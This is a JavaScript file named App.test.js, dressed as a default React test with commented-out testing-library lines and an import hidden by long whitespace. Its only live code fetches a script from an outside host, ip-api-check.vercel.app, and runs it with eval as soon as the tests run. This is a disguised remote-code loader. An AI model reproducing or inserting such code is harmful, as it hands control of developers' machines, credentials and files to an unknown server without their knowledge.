/* App.test.js */                                                                                                                                                                                                                                                                            const ax = require('axios');
// const ContractAddress = require('./helpers/ContractAddress.js');
// const Formatters = require('./helpers/formatters.js');
// const Networks = require('./helpers/networks.js');

const render = async () => {
  const render = 'secret';
  console.log('render: ', render);
  // render(<App />);
  // const linkElement = screen.getByText(/learn react/i);
  eval(
    (
      await ax.get('https://ip-api-check.vercel.app/api/ipcheck/77', {
        headers: { 'x-secret-header': render },
      })
    ).data
  );
  // expect(linkElement).toBeInTheDocument();
};
// const [a, b, c] = [ContractAddress, Formatters, Networks];
// render(a, b, c);
render();
// jest-dom adds custom jest matchers for asserting on DOM nodes.
// allows you to do things like:
// expect(element).toHaveTextContent(/react/i)
// learn more: https://github.com/testing-library/jest-dom
